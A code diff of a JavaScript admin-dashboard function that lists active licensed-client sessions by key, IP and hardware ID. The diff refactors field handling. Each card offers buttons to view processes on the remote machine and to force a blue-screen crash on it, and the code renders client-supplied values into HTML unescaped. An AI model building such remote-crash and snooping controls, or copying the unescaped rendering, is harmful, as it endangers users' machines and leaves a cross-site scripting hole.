@@ -806,28 +806,30 @@ async function loadMonitor() {
         return;
     }
     container.innerHTML = r.sessions.map(s => {
+        const sid = s.session_id || s.id || '';
+        const key = s.license || s.key || '??';
         const age = Math.floor((Date.now()/1000 - new Date(s.created).getTime()/1000) / 60);
         const ageStr = age < 60 ? age + 'm' : Math.floor(age/60) + 'h ' + (age%60) + 'm';
         return `<div style="background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:18px;display:flex;flex-direction:column;gap:12px">
             <div style="display:flex;justify-content:space-between;align-items:center">
                 <div style="display:flex;align-items:center;gap:10px">
-                    <div style="width:36px;height:36px;background:linear-gradient(135deg,var(--accent),#7c3aed);border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:13px;color:#fff">${(s.key || '??').substring(0,2)}</div>
+                    <div style="width:36px;height:36px;background:linear-gradient(135deg,var(--accent),#7c3aed);border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:13px;color:#fff">${key.substring(0,2)}</div>
                     <div>
-                        <div style="font-weight:600;font-size:13px;color:var(--text)">${s.key || 'Unknown'}</div>
-                        <div style="font-size:11px;color:var(--text3)">Session: ${s.id.substring(0,12)}...</div>
+                        <div style="font-weight:600;font-size:13px;color:var(--text)">${key}</div>
+                        <div style="font-size:11px;color:var(--text3)">Session: ${sid.substring(0,12)}...</div>
                     </div>
                 </div>
                 <span class="badge badge-green">Active</span>
             </div>
             <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;font-size:11px">
                 <div style="color:var(--text3)">IP Address</div><div style="color:var(--text2);text-align:right">${s.ip}</div>
-                <div style="color:var(--text3)">HWID</div><div style="color:var(--text2);text-align:right;font-family:Consolas,monospace;font-size:10px">${(s.hwid||'').substring(0,16)}...</div>
+                <div style="color:var(--text3)">HWID</div><div style="color:var(--text2);text-align:right;font-family:Consolas,monospace;font-size:10px">${s.hwid || '-'}</div>
                 <div style="color:var(--text3)">Session Age</div><div style="color:var(--text2);text-align:right">${ageStr}</div>
                 <div style="color:var(--text3)">Last Seen</div><div style="color:var(--text2);text-align:right">${fmtDate(s.last_seen)}</div>
             </div>
             <div style="display:flex;gap:8px;margin-top:4px">
-                <button class="btn" onclick="openTaskManager('${s.id}')" style="flex:1;font-size:11px;padding:7px 0">View Processes</button>
-                <button class="btn" onclick="confirmBsod('${s.id}','${(s.key||'?').replace(/'/g,'')}')" style="flex:1;font-size:11px;padding:7px 0;background:#dc2626;border-color:#dc2626;color:#fff">BSOD</button>
+                <button class="btn" onclick="openTaskManager('${sid}')" style="flex:1;font-size:11px;padding:7px 0">View Processes</button>
+                <button class="btn" onclick="confirmBsod('${sid}','${key.replace(/'/g,'')}')" style="flex:1;font-size:11px;padding:7px 0;background:#dc2626;border-color:#dc2626;color:#fff">BSOD</button>
             </div>
         </div>`;
     }).join('');
